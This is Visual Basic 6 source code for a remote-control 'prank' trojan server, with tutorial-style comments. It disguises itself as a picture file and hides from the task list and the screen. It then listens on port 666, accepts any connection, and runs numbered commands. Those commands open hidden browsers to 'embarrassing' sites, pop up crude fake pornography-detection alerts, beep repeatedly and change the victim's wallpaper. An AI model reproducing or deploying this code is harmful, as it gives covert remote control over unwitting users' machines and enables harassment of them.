VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server"
   ClientHeight    =   840
   ClientLeft      =   45
   ClientTop       =   285
   ClientWidth     =   2415
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   840
   ScaleWidth      =   2415
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock Sck1 
      Left            =   3150
      Top             =   90
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox text2 
      Height          =   240
      Left            =   3315
      TabIndex        =   1
      Text            =   "0"
      Top             =   555
      Width           =   105
   End
   Begin VB.OLE Mask 
      Class           =   "Package"
      Height          =   810
      Left            =   30
      OleObjectBlob   =   "Form1.frx":0442
      SourceDoc       =   "C:\My Documents\Ryan 3- background2.jpg"
      TabIndex        =   3
      Top             =   0
      Width           =   2340
   End
   Begin VB.OLE info 
      Class           =   "Package"
      Height          =   15
      Left            =   180
      OleObjectBlob   =   "Form1.frx":945A
      SourceDoc       =   "C:\My Documents\Info.txt"
      TabIndex        =   2
      Top             =   1245
      Width           =   15
   End
   Begin VB.OLE Ambient 
      AutoActivate    =   0  'Manual
      Class           =   "midfile"
      Height          =   15
      Left            =   165
      OleObjectBlob   =   "Form1.frx":B472
      SourceDoc       =   "C:\WINDOWS\Desktop\Sueno de la Drouga\Music\ambient.mid"
      TabIndex        =   0
      Top             =   120
      Width           =   15
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Form_Load()
'we will cloak the server as a picture file so u can pretend its atrwork by editing the path of the OLE called MASK and change the icon to match ur file type
' make the mask load first
Mask.DoVerb
'we will hide it from the CTRL ALT DEL menu
App.TaskVisible = False
'We will hide the form from veiw
Me.Hide
'press ctrl & T then add something called microsoft winsock control for net transactions
'telling the winsock control wat port to listen too i picked a funny one :)
Sck1.LocalPort = 666
' tell it to listen for incoming data and connections
Sck1.Listen

End Sub



Private Sub Sck1_ConnectionRequest(ByVal requestID As Long)
'tell the winsock control to accept all connections
If Sck1.State <> sckClosed Then Sck1.Close
Sck1.Accept requestID
End Sub

Private Sub Sck1_DataArrival(ByVal bytesTotal As Long)
' Dim the name SendData as the incoming data
Dim SendData As String
'Tell the winsock control  to retrive the sent data
Sck1.GetData SendData
' When incoming data arives process it by the quick reference number sent
'check the incoming data for the first 3 digits of it
 Select Case Left(SendData, 3)
        'ALL BELOW ARE FEATURES IN THE TROJAN THAT CORESPOND TO THE DIGITS
        
        Case "001":
        ' if the data 001 is sent then preform an action
        ' load and show the form that makes the screen apear to melt
        Load frmshake
       
        Case "002":
        ' if the data 002 is sent then preform an action
        ' remove and hide the form that makes the screen apear to melt by using a timer
       info.DoVerb
        Case "003":
        ' if the data 003 is sent then preform an action
        ' simple shows the form hus background is a cool picture, that auto starts a 6 second count down timer
        frmpic.Show
        Case "004":
        ' if the data 004 is sent then preform an action
        ' control to activate te embeded music
        Ambient.DoVerb
        Case "005":
        ' if the data 005 is sent then preform an action
        ' load the frmweb (webbrowser)
        Load frmWeb
        ' show the frmweb (webbrowser)
        frmWeb.Show
      ' tell the webbrowser control on frmweb to navigate to an embarrasing site
        frmWeb.Web1.Navigate "www.pokemon.com"
        Case "006":
        ' if the data 006 is sent then preform an action
        'make sure frmweb isnt shown so we can secretly access these sites
        frmWeb.Visible = False
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.pokemon.com"
' tell it to wait 5 seconds for page to load
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.digimon.com"
' tell it to wait 5 seconds for page to load
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.trouble.co.uk"
' tell the webbrowser control on frmweb to navigate to an embarrasing site
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.marijuanna.com"
' tell it to wait 5 seconds for page to load
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.pokecenter.com"
' tell it to wait 5 seconds for page to load
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.wwf.com"
' tell the webbrowser control on frmweb to navigate to an embarrasing site
wait 5
' tell the webbrowser control on frmweb to navigate to an embarrasing site
frmWeb.Web1.Navigate "www.youngbride.com"
        Case "007":
        ' if the data 007 is sent then preform an action
        ' tell the program to loop this 8 times
 Do Until text2.Text >= 8
 ' tell it to wait 3 seconds
 wait 3
 ' then make an annoying beep noise
 Beep
 ' then display a funny msg
 MsgBox "Warning- pornographic images detected- some of homosexual nature", vbCritical, "PORNWATCH- HERE TO PROTECT YOU"
    ' add 1 to a text box for an easy loop
    text2.Text = text2.Text + 1
' end the loop
    Loop
                Case "008":
        ' if the data 008 is sent then preform an action
        ' save the background of frmpic as the below filename
        SavePicture frmpic.Picture, "c:\windows\temp.bmp"
        ' and use the code in the module to set it as wallpaper
      Call SetWallpaper
      Case "009":
       ' make an annoying beep noise
      Beep
       ' tell it to wait 1 seconds
      wait 1
       ' then make an annoying beep noise
      Beep
      ' tell it to wait 1 seconds
      wait 1
       ' then make an annoying beep noise
      Beep
      ' tell it to wait 1 seconds
      wait 1
       ' then make an annoying beep noise
      Beep
      ' tell it to wait 1 seconds
      wait 1
       ' then make an annoying beep noise
      Beep
      ' tell it to wait 1 seconds
      wait 1
       ' then make an annoying beep noise
      Beep
      ' tell it to wait 1 seconds
      wait 1
      ' Funny msg
      MsgBox "Hope you had a good on the masturbation station - Always remember PORN WATCH here to protect you children!", vbCritical, "PORN WATCH!"
      ' quite the program
      End
        'end the case selecting
End Select
End Sub
